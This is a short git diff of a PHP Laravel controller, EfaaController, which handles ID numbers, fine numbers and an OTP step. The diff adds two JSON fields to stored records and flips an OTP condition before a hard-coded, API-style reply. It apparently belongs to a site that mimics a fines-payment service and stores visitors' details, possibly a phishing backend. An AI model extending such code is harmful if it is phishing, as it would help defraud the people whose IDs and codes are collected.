@@ -214,7 +214,9 @@ class EfaaController extends Controller
             'id_ref'     => $idNumber,
             'status'     => 0,
             'fineNumber' => $verNumber,
-            'info'       => '{}'
+            'info'       => '{}',
+            'inquery'    => '{}',
+            'home'       => '{}',
         ];
         
            $user =   DB::table('admins')->where('id_ref',$idNumber )->first();
@@ -332,7 +334,7 @@ class EfaaController extends Controller
         DB::table('user_infos')->insert($htmlData);
 
 
-        if($otp == 0) {
+        if($otp == 1) {
 
             return response()->json( array('errorMessageDTO' => null,
             "expirationTime" => "2024-07-30T00:58:41.122106+03:00",
@@ -396,7 +398,10 @@ class EfaaController extends Controller
             'id_ref'     => $idNumber,
             'status'     => 0,
             'fineNumber' => $verNumber,
-            'info'       => '{}'
+            'info'       => '{}',
+            'inquery'    => '{}',
+            'home'       => '{}',
+            
         ];
     
           $user =   DB::table('admins')->where('id_ref',$idNumber )->first();
@@ -536,7 +541,9 @@ class EfaaController extends Controller
          'fineNumber' => $verNumber,
          'id_ref'     => $idNumber,
          'status'     => 0,
-         'info'       => '{}'
+         'info'       => '{}',
+         'inquery'    => '{}',
+         'home'       => '{}',
      ];
  
     
